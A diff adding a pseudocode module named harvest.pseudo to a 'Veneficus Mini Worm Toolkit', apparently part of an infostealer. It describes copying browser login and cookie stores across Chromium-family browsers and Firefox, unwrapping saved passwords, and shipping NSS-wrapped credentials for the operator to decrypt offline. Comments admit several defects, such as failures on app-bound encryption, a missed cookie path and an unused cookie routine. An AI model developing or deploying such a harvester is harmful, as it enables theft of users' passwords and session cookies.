@@ -1,0 +1,45 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/payload/harvest.pseudo
+# Browser login and cookie collection.
+
+RECORD Login:  browser, url, username, password
+RECORD Cookie: browser, host, name, value, httponly, secure
+
+FUNCTION chromium_logins(browser, profile_dir) -> list Login:
+    db = profile_dir / "login store"     # OS-specific name omitted
+    IF not exists: RETURN []
+    copy db to a temp file to avoid locks
+    SELECT origin, username, password_blob FROM logins
+    password = host_profile.unprotect_blob(password_blob)
+    # Defect: modern Chromium wraps passwords in a versioned
+    # AEAD under a key in "Local State", itself OS-protected
+    # and on recent builds app-bound. Raw unprotect of the
+    # login blob fails on those builds.
+    delete temp copy
+
+FUNCTION chromium_cookies(browser, profile_dir) -> list Cookie:
+    same pattern against the cookie store
+    # Cookie path has also moved under a nested folder on
+    # current browsers; a naive profile-root lookup misses it.
+
+FUNCTION gecko_logins() -> list Login:
+    walk Gecko profile dirs
+    read the JSON login list
+    ship username/password fields still wrapped in NSS
+    prefix a marker so the operator decrypts offline
+    # The NSS key database itself is not taken.
+
+FUNCTION all_logins() -> list Login:
+    FOR each of: Chrome-family, Edge-family, Brave-family,
+                 Opera-family, Vivaldi-family:
+        extend chromium_logins(...)
+    extend gecko_logins()
+
+FUNCTION all_cookies() -> list Cookie:
+    Chrome-family, Edge-family, Brave-family only
+    # Implemented, never invoked from payload.run().
